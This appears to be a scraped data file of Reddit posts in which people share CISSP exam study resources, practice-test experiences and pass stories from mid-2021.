MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

2692,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue. 

I am beyond relieved and taking some much needed time off.",2021-07-11

2694,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

2696,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.  
Im not a reddit user but reading this reddit helped me much with my preparations so I decided to share my experience :)",2021-07-06
2697,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
2698,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat. 

Good luck to everyone who's preparing.",2021-07-15
2700,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
2701,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

2702,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10
2703,om5zfm,Provisionally passed on first attempt,"Just wanted to share my accomplishment and say that the stories and resources I found on this sub were instrumental to my success. Good luck to everyone on their future attempts and, again, thank all of you!",2021-07-17
2704,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

And if you're newer to the industry, even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!",2021-07-09

I have been working in cyber security roles for well over 6 years the financial services industry. I studied very casually the Sybex book for about  4 months on and off for an hour or two a day. I do not consider myself technically minded at all or have been in technical roles.  I didn't feel good about a-lot of the questions, but was able to at least choose between two responses where I felt reasonably comfortable.  No math or memorization was required, but it does require knowing lot of the technical term definitions as a baseline.

I completed all 150 questions.",2021-07-29
2706,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful. I had to remind myself many times not to take ANYTHING too harshly in my mind.

I was shocked when the exam stopped at 100 questions. Didn’t note my final time but it was right around an hour.

Good luck to all for whom the exam is still upcoming!",2021-07-24
2707,oi3d0v,"Passed @100 - 120 minutes, 2nd Attempts","I cannot explain the joy and mental relief of passing this exam, especially after failing on 1st attempt. I was panic reading until last minute trying to cramp as much knowledge as possible, my best advice is to relax on the exam day.  After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.  While collecting the items the tears rolled down (its okay to cry). This exam was not just exam it was my dream, I am not sure what it will hold in future but it was my first professional level exam and i gave all for this exam. I always stayed around 2 hr after work just to study for the exam. I prepared this exam for almost 1 year getting distracted in between with free COMPTIA beta exams. I am currently in US in F1 visa (student) and its really hard to find the Job, the struggle is REAL.  My Background 5 Years in General IT (Network support/ Help Desk support/Jr System admin stuff )in home country never had any true Security Position. I want to get my foot into Security, i hope this certification will help at least to pass through the ATS.

2708,orja5k,#CISSP just another Exam,"I have my exam scheduled in 2 weeks. Am I prepared with all the resources mentioned in the 100s of posts here - No. Will I postpone - NO! 

I am studying for the last 3 months. Making a study plan a day prior, checking if I can spend some time the following day studying for the exam. I am not over-stretching myself. Where-ever I see, read - on youtube, blogs, forums - there is a lot of fear mongering around the exam. The same kind as we had during high school exams, college exams, university exams and the freshers company placements exams. What happened - we did not learn anything by choice but by fear. What such fear mongering does is lowers our morale and we start considering this exam as our worth decider. 

I am just writing this post - to give a perspective - that this is just an exam! And especially designed for professionals - who work 8-10 hours a day, have other Misc. work, life crisis, relationships and in summary are adults with a whole lot of responsibilities. 

If you read this post, do study for the exam at your own pace, give your own best (don't read others opinion how tough the exam is) and then in the end it is just a result (Pass or Fail). No exam can value the minimum of 5 years of experience we all have in the Information Security Field. 

The exam is worth it for sure, to learn and test our knowledge but the kind of fearful stature we give to this exam should be stopped - we are adults and not students. We have experienced life and we know it will be Okay! 

All the Best to you, you will pass. Just be calm and don't loose in your mind - before the exam.",2021-07-25

I couldn't be happier, I've prepped for almost 2 years.

&#x200B;

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=HWg2geVJuvs](https://www.youtube.com/watch?v=HWg2geVJuvs)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

2021Going into the exam I was much more well prepared, but I knew I had weaknesses. I felt like I could pass anyways.

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Practice Tests:**  


**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong

2713,oonpos,Passed yesterday with 100 questions,"So glade to have this done. Been in IT for a while and never got any certs. In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.  

You guys can can pass easily if you apply the right mindset. DO NOT go into the testing room without the right mindset or you will fail.

2714,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.


